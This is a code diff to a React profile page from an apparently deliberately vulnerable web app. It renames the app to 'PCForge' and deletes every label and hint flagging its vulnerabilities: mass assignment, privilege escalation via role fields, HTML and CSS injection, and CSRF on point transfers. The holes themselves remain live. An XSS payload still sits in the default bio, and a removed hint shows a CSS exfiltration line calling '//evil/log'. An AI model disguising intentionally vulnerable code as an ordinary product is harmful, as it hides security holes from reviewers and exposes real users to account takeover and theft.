@@ -14,7 +14,7 @@ export default function Profile() {
   const [bioHtml, setBioHtml] = useState("<i>PC builder từ 2010</i><img src=x onerror=alert(1)>");
   const [themeCss, setThemeCss] = useState("body { background: #0d1117 } .card { border-color: #58a6ff }");
   const [out, setOut] = useState("");
-  const [transfer, setTransfer] = useState({ to: "victim@vulnpc.local", amount: "10" });
+  const [transfer, setTransfer] = useState({ to: "victim@pcforge.local", amount: "10" });
   const [transferOut, setTransferOut] = useState("");
 
   useEffect(() => {
@@ -66,12 +66,12 @@ export default function Profile() {
       <h1>Hồ sơ</h1>
 
       <div className="card">
-        <h2>Full row từ /api/auth/me (sensitive data exposure #44)</h2>
+        <h2>Thông tin tài khoản</h2>
         <pre>{JSON.stringify(profile, null, 2)}</pre>
       </div>
 
       <div className="card">
-        <h2>Thông tin cá nhân (mass assignment #51)</h2>
+        <h2>Thông tin cá nhân</h2>
         <div className="row">
           <div>
             <label>Họ tên</label>
@@ -88,7 +88,7 @@ export default function Profile() {
         </div>
         <div className="row">
           <div>
-            <label>role (escalation #13)</label>
+            <label>role</label>
             <input value={form.role} onChange={(e) => setForm({ ...form, role: e.target.value })} />
           </div>
           <div>
@@ -103,16 +103,11 @@ export default function Profile() {
             💾 Save (PUT mọi field)
           </button>
         </div>
-        <p className="hint">
-          Bật is_admin + role=admin rồi vào trang <b>Admin</b> — privilege escalation #13/#51. Server ghi mọi key client
-          gửi (cột SQL cũng từ client — bonus SQLi #1).
-        </p>
         {out && <pre>{out}</pre>}
       </div>
 
       <div className="card">
-        <h2>Bio (HTML injection #12)</h2>
-        <p className="hint">HTML render thẳng dưới đây — form login giả hay &lt;img onerror&gt; đều chạy.</p>
+        <h2>Bio</h2>
         <div className="row" style={{ width: "100%" }}>
           <textarea rows={2} value={bioHtml} onChange={(e) => setBioHtml(e.target.value)} style={{ flex: 1 }} />
           <button
@@ -129,11 +124,7 @@ export default function Profile() {
       </div>
 
       <div className="card">
-        <h2>Tùy biến giao diện (CSS injection #13)</h2>
-        <p className="hint">
-          CSS của bạn được inject thẳng vào &lt;style&gt; — attribute selector exfil dữ liệu input:{" "}
-          <code>input[value^="4"] &#123; background: url("//evil/log") &#125;</code>
-        </p>
+        <h2>Tùy biến giao diện (CSS)</h2>
         <div className="row" style={{ width: "100%" }}>
           <textarea rows={2} value={themeCss} onChange={(e) => setThemeCss(e.target.value)} style={{ flex: 1 }} />
           <button
@@ -149,11 +140,8 @@ export default function Profile() {
       </div>
 
       <div className="card">
-        <h2>💳 Ví VulnPC — chuyển tiền (CSRF #9)</h2>
-        <p className="hint">
-          <b>GET</b> <code>/api/orders/transfer</code> + cookie SameSite=None + không CSRF token — mở{" "}
-          <code>/csrf-demo.html</code> ở tab khác để exploit chéo site. Số âm = tự cộng tiền (#54).
-        </p>
+        <h2>💳 Ví PCForge — chuyển điểm</h2>
+        <p className="hint">Chuyển điểm cho bạn bè qua email tài khoản.</p>
         <div className="row">
           <input value={transfer.to} onChange={(e) => setTransfer({ ...transfer, to: e.target.value })} />
           <input value={transfer.amount} onChange={(e) => setTransfer({ ...transfer, amount: e.target.value })} style={{ width: 100 }} />
